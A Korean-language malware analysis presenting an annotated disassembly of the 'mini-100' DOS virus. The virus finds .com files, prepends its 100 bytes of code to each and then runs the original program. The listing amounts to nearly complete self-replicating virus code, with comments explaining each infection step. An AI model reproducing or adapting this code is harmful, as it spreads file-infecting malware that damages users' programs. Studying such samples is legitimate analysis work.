; mini-100 바이러스 분석
; Analysis by g0pher

; <특징>
; 확장자 .com 파일을 감염
; 감염된 파일은 100byte 증가
; 전위형 바이러스

PUSH    SI          ; SI(0) 백업
PUSH    SI
POP     DI
MOV     AX,CS
INC     AH
MOV     ES,AX
MOV     CL,64
REPZ
MOVSB               ; 현재 코드를 64h만큼 +100h 위치로 복사(악성코드 백업)
POP     SI          ; SI(0) 복구

MOV     AH,4E
MOV     DX,015E
INT     21          ; *.com 파일 찾도록 설정

JNB     012D        ; 파일을 찾으면 점프(Line 41:xchg)

PUSH    SI          ; SI(0) 백업
PUSH    ES
PUSH    CS
POP     ES
XCHG    DI,SI
MOV     CX,FE9B
MOV     AX,0125
PUSH    AX
RETF                ; 백업한 악성코드로 점프. 다음 명령은 같음.

REPZ                ; 바이러스 뒤에있는 원본코드 내용을 맨 처음에 덮어쓰기
MOVSB

POP     SI의        ; SI(0) 복구
PUSH    ES
PUSH    ES
POP     DS
PUSH    SI
RETF                ; 코드 맨 처음으로 가서 원본 코드 실행. 끝.

XCHG    DX,AX
MOV     AX,3D02
MOV     DL,9E
INT     21          ; 해당 파일을 읽기/쓰기 가능하도록 연다.

XCHG    BX,AX
PUSH    ES
POP     DS
MOV     AH,3F
PUSH    DI
POP     DX
XOR     CX,CX
PUSH    CX
DEC     CX
INT     21          ; FFFF 만큼 파일을 읽어서 백업한 바이러스 뒤에 삽입한다.

ADD     AX,0064
POP     CX
PUSH    AX
MOV     AX,4200
CWD
INT     21          ; 해당 파일의 포인터를 파일 시작 위치로 옮긴다

MOV     AH,40
POP     CX
PUSH    SI
POP     DX
INT     21          ; 해당 파일에 원본코드 + 바이러스를 쓴다

PUSH    CS
POP     DS          ; 다음 파일 분기를 위해 DS 복구
MOV     AH,3E
INT     21          ; 해당 파일 핸들을 닫는다.

MOV     AH,4F
JMP     0113        ; 다음 파일 처리를 위한 분기(Line 17:int)

SUB     CH,[6F63]
DB      6D
ADD     BL,AL       ; *.com 이라는 문자열